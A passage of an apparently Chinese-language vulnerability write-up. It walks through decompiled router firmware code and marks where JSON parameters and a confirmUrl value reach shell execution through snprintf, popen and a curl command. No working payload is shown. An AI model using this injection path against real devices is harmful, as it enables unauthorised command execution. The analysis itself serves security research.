v81,</span><br><span class="line">            v78 + <span class="number">112</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( HIBYTE(_20_23_is_data[<span class="number">4</span>]) &amp;&amp; g_debug &gt;= <span class="number">2</span> || g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        uf_log_printf(</span><br><span class="line">          uf_log,</span><br><span class="line">          <span class="string">&quot;(%s %s %d)%s %s -m %s [mutex:%d]&quot;</span>,</span><br><span class="line">          <span class="string">&quot;ufm_lib.c&quot;</span>,</span><br><span class="line">          <span class="string">&quot;uf_cmd_call&quot;</span>,</span><br><span class="line">          <span class="number">597</span>,</span><br><span class="line">          uf_call_type_str[_20_23_is_data[<span class="number">7</span>]],</span><br><span class="line">          (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">5</span>],</span><br><span class="line">          (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">14</span>],</span><br><span class="line">          v78 + <span class="number">112</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v95 = ufm_handle((<span class="type">int</span>)_20_23_is_data);    <span class="comment">// 命令执行点</span></span><br><span class="line">      <span class="keyword">goto</span> LABEL_211;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( sub_4078B4((<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">14</span>]) )</span><br><span class="line">      v54 = (<span class="type">char</span> *)dword_4364AC;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v54 = <span class="string">&quot;0&quot;</span>;</span><br><span class="line">    _20_23_is_data[<span class="number">10</span>] = (<span class="type">int</span>)v54;</span><br><span class="line">    _20_23_is_data[<span class="number">9</span>] = dword_4364A8;</span><br><span class="line">LABEL_171:</span><br><span class="line">    v53 = (<span class="type">int</span> *)addr;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_172;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(_20_23_is_data[<span class="number">20</span>], <span class="string">&#x27;&#125;&#x27;</span>) || <span class="built_in">strchr</span>(data_2, <span class="string">&#x27;]&#x27;</span>) )<span class="comment">// 如果data段中有]或&#125;,显然进去</span></span><br><span class="line">  &#123;</span><br><span class="line">    _20_23_is_data[<span class="number">23</span>] = json_tokener_parse(data_2, v49);</span><br><span class="line">    <span class="keyword">if</span> ( _20_23_is_data[<span class="number">23</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">        uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)start param parse:%s&quot;</span>, <span class="string">&quot;ufm_lib.c&quot;</span>, <span class="string">&quot;parse_param&quot;</span>, <span class="number">142</span>, data_2);</span><br><span class="line">      data_4 = json_object_get_object(_20_23_is_data[<span class="number">23</span>]);</span><br><span class="line">      <span class="keyword">if</span> ( data_4 )</span><br><span class="line">        v56 = *(<span class="type">int</span> **)(data_4 + <span class="number">32</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v56 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ( v56 )</span><br><span class="line">      &#123;</span><br><span class="line">        v57 = *v56;</span><br><span class="line">        v58 = *v56;</span><br><span class="line">        v59 = v56[<span class="number">1</span>];</span><br><span class="line">        v56 = (<span class="type">int</span> *)v56[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v58, <span class="string">&quot;module&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          _20_23_is_data[<span class="number">15</span>] = json_object_get_string(v59);</span><br><span class="line">          <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">            uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)para-module:%s&quot;</span>, <span class="string">&quot;ufm_lib.c&quot;</span>, <span class="string">&quot;parse_param&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v57, <span class="string">&quot;device&quot;</span>) || *(_DWORD *)(addr + <span class="number">16</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v57, <span class="string">&quot;groupId&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            _20_23_is_data[<span class="number">10</span>] = json_object_get_string(v59);</span><br><span class="line">            LOBYTE(_20_23_is_data[<span class="number">8</span>]) = <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v57, <span class="string">&quot;networkId&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            _20_23_is_data[<span class="number">9</span>] = json_object_get_string(v59);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v57, <span class="string">&quot;sn&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( json_object_get_type(v59) == <span class="number">5</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              _20_23_is_data[<span class="number">19</span>] = json_object_array_length(v59);</span><br><span class="line">              <span class="keyword">if</span> ( _20_23_is_data[<span class="number">19</span>] &gt; <span class="number">0</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                idx = json_object_array_get_idx(v59, <span class="number">0</span>);</span><br><span class="line">                _20_23_is_data[<span class="number">18</span>] = json_object_get_string(idx);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v57, <span class="string">&quot;configId&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            _20_23_is_data[<span class="number">11</span>] = json_object_get_string(v59);</span><br><span class="line">            <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">              uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)param configId:%s&quot;</span>, <span class="string">&quot;ufm_lib.c&quot;</span>, <span class="string">&quot;parse_param&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v57, <span class="string">&quot;configTime&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            _20_23_is_data[<span class="number">12</span>] = json_object_get_string(v59);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v57, <span class="string">&quot;currentTime&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            _20_23_is_data[<span class="number">13</span>] = json_object_get_string(v59);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v57, <span class="string">&quot;buffer&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            _20_23_is_data[<span class="number">16</span>] = json_object_get_string(v59);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v57, <span class="string">&quot;file&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            _20_23_is_data[<span class="number">17</span>] = json_object_get_string(v59);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v57, <span class="string">&quot;existIndepend&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            v62 = json_object_get_string(v59);</span><br><span class="line">            <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v62, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">              BYTE2(_20_23_is_data[<span class="number">1</span>]) = <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v60 = (<span class="type">const</span> <span class="type">char</span> *)json_object_get_string(v59);</span><br><span class="line">          <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">            uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)device:%s&quot;</span>, <span class="string">&quot;ufm_lib.c&quot;</span>, <span class="string">&quot;parse_param&quot;</span>, <span class="number">149</span>, v60);</span><br><span class="line">          <span class="keyword">if</span> ( v60 )</span><br><span class="line">            *(_DWORD *)(addr + <span class="number">16</span>) = strdup(v60);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !_20_23_is_data[<span class="number">7</span>] )                 <span class="comment">// 这里不进去</span></span><br><span class="line">      &#123;</span><br><span class="line">        v63 = _20_23_is_data[<span class="number">9</span>];</span><br><span class="line">        <span class="keyword">if</span> ( !_20_23_is_data[<span class="number">10</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( sub_4078B4((<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">14</span>])</span><br><span class="line">            || _20_23_is_data[<span class="number">15</span>] &amp;&amp; sub_4078B4((<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">15</span>]) )</span><br><span class="line">          &#123;</span><br><span class="line">            v64 = (<span class="type">char</span> *)dword_4364AC;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v64 = <span class="string">&quot;0&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          _20_23_is_data[<span class="number">10</span>] = (<span class="type">int</span>)v64;</span><br><span class="line">          v63 = _20_23_is_data[<span class="number">9</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        v65 = _20_23_is_data[<span class="number">10</span>];</span><br><span class="line">        <span class="keyword">if</span> ( !v63 )</span><br><span class="line">        &#123;</span><br><span class="line">          _20_23_is_data[<span class="number">9</span>] = dword_4364A8;</span><br><span class="line">          v65 = _20_23_is_data[<span class="number">10</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v65 )</span><br><span class="line">        &#123;</span><br><span class="line">          v66 = <span class="built_in">strlen</span>(v65);</span><br><span class="line">          <span class="keyword">if</span> ( v66 &gt;= <span class="number">0x12</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v50 = <span class="string">&quot;ERROR (%s %s %d)groupId oversize %d&quot;</span>;</span><br><span class="line">LABEL_142:</span><br><span class="line">            v51 = <span class="string">&quot;detect_gid_nid_invalid&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_143;</span><br><span class="line">          &#125;</span><br><span class="line">          v67 = (<span class="type">char</span> *)v65;</span><br><span class="line">          v68 = (<span class="type">char</span> *)(v65 + v66);</span><br><span class="line">          <span class="keyword">while</span> ( v67 != v68 )</span><br><span class="line">          &#123;</span><br><span class="line">            v69 = *v67++;</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)(v69 - <span class="number">48</span>) &gt;= <span class="number">0xA</span>u )</span><br><span class="line">            &#123;</span><br><span class="line">              v50 = <span class="string">&quot;ERROR (%s %s %d)invalid char: %c, pure number need!&quot;</span>;</span><br><span class="line">              <span class="keyword">goto</span> LABEL_142;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        v70 = <span class="built_in">strlen</span>(_20_23_is_data[<span class="number">9</span>]);</span><br><span class="line">        <span class="keyword">if</span> ( v70 &gt;= <span class="number">0x22</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v50 = <span class="string">&quot;ERROR (%s %s %d)networkId oversize %d&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v71 = (<span class="type">unsigned</span> __int8 *)_20_23_is_data[<span class="number">9</span>];</span><br><span class="line">          v72 = (<span class="type">char</span> *)(_20_23_is_data[<span class="number">9</span>] + v70);</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( v71 == (<span class="type">unsigned</span> __int8 *)v72 )</span><br><span class="line">              &#123;</span><br><span class="line">                v75 = *(_DWORD *)addr;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_173;</span><br><span class="line">              &#125;</span><br><span class="line">              v73 = (<span class="type">char</span>)*v71;</span><br><span class="line">              v74 = *v71;</span><br><span class="line">              <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(v74 - <span class="number">48</span>) &gt;= <span class="number">0xB</span> &amp;&amp; (v74 &amp; <span class="number">0xFFFFFFDF</span>) - <span class="number">65</span> &gt;= <span class="number">0x1A</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              ++v71;</span><br><span class="line">            &#125;</span><br><span class="line">            ++v71;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( v73 == <span class="number">95</span> );</span><br><span class="line">          v50 = <span class="string">&quot;ERROR (%s %s %d)invalid char: %c, need [number][:][A~Z][_][a~z]!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_142;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_171;                           <span class="comment">// 执行这个</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_93:</span><br><span class="line">  v50 = <span class="string">&quot;ERROR (%s %s %d)param parse failed![%s]&quot;</span>;</span><br><span class="line">  v51 = <span class="string">&quot;parse_param&quot;</span>;</span><br><span class="line">LABEL_143:</span><br><span class="line">  v95 = <span class="number">0</span>;</span><br><span class="line">  uf_log_printf(uf_log, v50, <span class="string">&quot;ufm_lib.c&quot;</span>, v51);</span><br><span class="line">  _20_23_is_data[<span class="number">22</span>] = strdup(<span class="string">&quot;&#123;\&quot;rcode\&quot;:\&quot;03510003\&quot;,\&quot;rmsg\&quot;:\&quot;UF: param is invalid\&quot;&#125;&quot;</span>);</span><br><span class="line">LABEL_244:</span><br><span class="line">  v82 = addr;</span><br><span class="line">LABEL_212:</span><br><span class="line">  v83 = LOBYTE(_20_23_is_data[<span class="number">26</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( !*(_BYTE *)(v82 + <span class="number">45</span>) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_237;</span><br><span class="line">  <span class="keyword">if</span> ( !_20_23_is_data[<span class="number">20</span>] )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_236;</span><br><span class="line">  data_3 = json_tokener_parse(*(_DWORD *)(v82 + <span class="number">12</span>), v40);</span><br><span class="line">  v85 = data_3;</span><br><span class="line">  <span class="keyword">if</span> ( !data_3 )</span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)-u param is invalid!&quot;</span>, <span class="string">&quot;ufm_lib.c&quot;</span>, <span class="string">&quot;url_reply&quot;</span>, <span class="number">400</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_235;</span><br><span class="line">  &#125;</span><br><span class="line">  data_confirmUrl = json_object_object_get(data_3, <span class="string">&quot;confirmUrl&quot;</span>);</span><br><span class="line">  data_confirmUrl_1 = data_confirmUrl;</span><br><span class="line">  <span class="keyword">if</span> ( !data_confirmUrl || json_object_get_type(data_confirmUrl) != <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)url is empty!&quot;</span>, <span class="string">&quot;ufm_lib.c&quot;</span>, <span class="string">&quot;url_reply&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_234;</span><br><span class="line">  &#125;</span><br><span class="line">  v89 = (<span class="type">const</span> <span class="type">char</span> *)json_object_get_string(data_confirmUrl_1);</span><br><span class="line">  v88 = <span class="built_in">strlen</span>(v89);</span><br><span class="line">  v90 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">malloc</span>(v88 + <span class="number">128</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v90 )</span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)malloc failed!&quot;</span>, <span class="string">&quot;ufm_lib.c&quot;</span>, <span class="string">&quot;url_reply&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_234;</span><br><span class="line">  &#125;</span><br><span class="line">  v91 = <span class="built_in">strlen</span>(v89);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v90[v91], <span class="number">0</span>, <span class="number">128</span>);</span><br><span class="line">  v92 = <span class="built_in">strlen</span>(v89);</span><br><span class="line">  <span class="built_in">snprintf</span>(</span><br><span class="line">    v90,</span><br><span class="line">    v92 + <span class="number">127</span>,</span><br><span class="line">    <span class="string">&quot;curl -m 5 -s -k -X POST \&quot;%s\&quot; -H &#x27;content-type: application/json&#x27; -d &#x27;&#123;\&quot;code\&quot;:\&quot;0\&quot;,\&quot;msg\&quot;:\&quot;success\&quot;&#125;&#x27;&quot;</span>,</span><br><span class="line">    v89);</span><br><span class="line">  v96[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v93 = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ufm_popen(v90, v96);                        <span class="comment">// 命令执行点</span></span><br><span class="line">........</span><br><span class="line">  &#125;</span><br><span class="line">.........</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跳到这里之后就跳过第一个if进入第二个if，然后执行goto LABEL_171;   和goto LABEL_172;  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">LABEL_172:</span><br><span class="line">      v75 = *v53;</span><br><span class="line">LABEL_173:</span><br><span class="line">      <span class="keyword">if</span> ( !v75 &amp;&amp; g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">        uf_log_printf(</span><br><span class="line">          uf_log,</span><br><span class="line">          <span class="string">&quot;(%s %s %d)para networkId:%s, groupId:%s!&quot;</span>,</span><br><span class="line">          <span class="string">&quot;ufm_lib.c&quot;</span>,</span><br><span class="line">          <span class="string">&quot;uf_cmd_call&quot;</span>,</span><br><span class="line">          <span class="number">538</span>,</span><br><span class="line">          (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">9</span>],</span><br><span class="line">          (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">10</span>]);</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(_20_23_is_data[<span class="number">5</span>], <span class="string">&quot;get&quot;</span>)</span><br><span class="line">        &amp;&amp; ((v76 = _20_23_is_data[<span class="number">14</span>], !<span class="built_in">strcmp</span>(_20_23_is_data[<span class="number">14</span>], <span class="string">&quot;configPath&quot;</span>))</span><br><span class="line">         || !<span class="built_in">strcmp</span>(v76, <span class="string">&quot;configVersion&quot;</span>)</span><br><span class="line">         || !<span class="built_in">strcmp</span>(v76, <span class="string">&quot;configDefault&quot;</span>)) )</span><br><span class="line">      &#123;</span><br><span class="line">        v77 = _20_23_is_data[<span class="number">15</span>];</span><br><span class="line">        <span class="keyword">if</span> ( !_20_23_is_data[<span class="number">15</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          v78 = _20_23_is_data[<span class="number">24</span>];</span><br><span class="line">          <span class="keyword">goto</span> LABEL_184;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v77 = _20_23_is_data[<span class="number">14</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      _20_23_is_data[<span class="number">24</span>] = find_module_info(v77, &amp;_20_23_is_data[<span class="number">26</span>]);</span><br><span class="line">      v78 = _20_23_is_data[<span class="number">24</span>];</span><br><span class="line">LABEL_184:</span><br><span class="line">      <span class="keyword">if</span> ( v78 )</span><br><span class="line">      &#123;</span><br><span class="line">        v79 = addr;</span><br><span class="line">        <span class="keyword">if</span> ( !*(_BYTE *)(_20_23_is_data[<span class="number">0</span>] + <span class="number">48</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          pthread_mutex_lock(v78 + <span class="number">112</span>);</span><br><span class="line">          v98 = _20_23_is_data[<span class="number">24</span>];</span><br><span class="line">          <span class="keyword">if</span> ( _sigsetjmp(v96, <span class="number">0</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            pthread_mutex_unlock(v98 + <span class="number">112</span>);</span><br><span class="line">            _pthread_unwind_next(v96);</span><br><span class="line">          &#125;</span><br><span class="line">          _pthread_register_cancel(v96);</span><br><span class="line">          v80 = *(<span class="type">const</span> <span class="type">char</span> **)(addr + <span class="number">12</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v80 &amp;&amp; *v80 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( HIBYTE(_20_23_is_data[<span class="number">4</span>]) &amp;&amp; g_debug &gt;= <span class="number">2</span> || g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">              uf_log_printf(</span><br><span class="line">                uf_log,</span><br><span class="line">                <span class="string">&quot;(%s %s %d)%s %s -m %s &#x27;%s&#x27; [mutex:%d]&quot;</span>,</span><br><span class="line">                <span class="string">&quot;ufm_lib.c&quot;</span>,</span><br><span class="line">                <span class="string">&quot;uf_cmd_call&quot;</span>,</span><br><span class="line">                <span class="number">579</span>,</span><br><span class="line">                uf_call_type_str[_20_23_is_data[<span class="number">7</span>]],</span><br><span class="line">                (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">5</span>],</span><br><span class="line">                (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">14</span>],</span><br><span class="line">                v80,</span><br><span class="line">                _20_23_is_data[<span class="number">24</span>] + <span class="number">112</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( HIBYTE(_20_23_is_data[<span class="number">4</span>]) &amp;&amp; g_debug &gt;= <span class="number">2</span> || g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            uf_log_printf(</span><br><span class="line">              uf_log,</span><br><span class="line">              <span class="string">&quot;(%s %s %d)%s %s -m %s [mutex:%d]&quot;</span>,</span><br><span class="line">              <span class="string">&quot;ufm_lib.c&quot;</span>,</span><br><span class="line">              <span class="string">&quot;uf_cmd_call&quot;</span>,</span><br><span class="line">              <span class="number">583</span>,</span><br><span class="line">              uf_call_type_str[_20_23_is_data[<span class="number">7</span>]],</span><br><span class="line">              (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">5</span>],</span><br><span class="line">              (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">14</span>],</span><br><span class="line">              _20_23_is_data[<span class="number">24</span>] + <span class="number">112</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          v95 = ufm_handle((<span class="type">int</span>)_20_23_is_data);<span class="comment">// 命令执行点</span></span><br><span class="line">          pthread_mutex_unlock(_20_23_is_data[<span class="number">24</span>] + <span class="number">112</span>);</span><br><span class="line">          _pthread_unregister_cancel(v96);</span><br><span class="line">LABEL_211:</span><br></pre></td></tr></table></figure><p>就会发现之后有一个命令执行点ufm_handle，让我们先分析分析该函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;set&quot;</span>) || !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;add&quot;</span>) || !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;del&quot;</span>) || !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;update&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v28 = sub_40FD5C(a1);</span><br><span class="line">LABEL_169:</span><br><span class="line">      v1 = v28;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_176;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>由于我们的是set调用所以调用sub_40FD5C函数，经过分析调用sub_40CEAC(a1, a1 + 22, 0, 0) 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">snprintf</span>(&amp;v63[v67], v65, <span class="string">&quot; &#x27;%s&#x27;&quot;</span>, data);</span><br><span class="line">ufm_commit_add(<span class="number">0</span>, v63, <span class="number">1</span>, <span class="number">0</span>); </span><br></pre></td></tr></table></figure><p>主要的调用就是这两个，v63构成了shell</p><h4 id="ufm-commit-add"><a href="#ufm-commit-add" class="headerlink" title="ufm_commit_add"></a>ufm_commit_add</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">ufm_commit_add</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">unsigned</span> __int8 a3, <span class="type">const</span> <span class="type">char</span> **a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $s0</span></span><br><span class="line"></span><br><span class="line">  v4 = a3;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v6 = async_cmd_push_queue(a1, a2, a3);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = v6;</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      sem_wait(v6 + <span class="number">36</span>);</span><br><span class="line">      *a4 = *(<span class="type">const</span> <span class="type">char</span> **)(v8 + <span class="number">52</span>);</span><br><span class="line">      v7 = *(_DWORD *)(v8 + <span class="number">56</span>);</span><br><span class="line">      sub_41AD10(v8);</span><br><span class="line">      <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">        uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)commit ret:%d, rbuf:%s&quot;</span>, <span class="string">&quot;ufm_thd.c&quot;</span>, <span class="string">&quot;ufm_commit_add&quot;</span>, <span class="number">359</span>, v7, *a4);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="async-cmd-push-queue"><a href="#async-cmd-push-queue" class="headerlink" title="async_cmd_push_queue"></a>async_cmd_push_queue</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 